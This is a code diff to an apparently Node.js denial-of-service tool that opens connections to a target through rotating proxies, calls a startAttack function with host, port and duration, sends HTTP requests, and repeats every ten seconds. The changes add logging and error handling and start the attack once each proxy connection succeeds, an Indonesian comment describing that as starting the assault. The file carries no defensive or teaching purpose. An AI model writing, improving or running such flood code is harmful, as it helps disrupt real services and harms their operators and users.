@@ -34,20 +34,34 @@ function createTCPConnection() {
     const proxyHost = proxy[0];
     const proxyPort = proxy[1];
 
-    const socket = net.connect(proxyPort, proxyHost);
+    console.log(`Connecting to proxy ${proxyHost}:${proxyPort}`);
+
+    const socket = net.connect(proxyPort, proxyHost, () => {
+        console.log(`Connected to proxy ${proxyHost}:${proxyPort}`);
+        startAttack(host, targetPort, attackTime); // Memulai serangan setelah koneksi berhasil
+    });
+
     socket.setKeepAlive(false, 0);
     socket.setTimeout(5000);
 
-    // Send request to start attack
-    startAttack(host, targetPort, attackTime);
-
     socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
-    socket.on('data', () => {
+
+    socket.on('data', (data) => {
+        console.log(`Data received: ${data}`);
         setTimeout(() => {
             socket.destroy();
         }, 5000);
     });
+
+    socket.on('error', (err) => {
+        console.error(`Socket error: ${err.message}`);
+    });
+
+    socket.on('close', () => {
+        console.log(`Connection to proxy ${proxyHost}:${proxyPort} closed`);
+    });
 }
+
 
 // Create connections periodically
 setInterval(createTCPConnection, 10000); // Adjust interval as needed
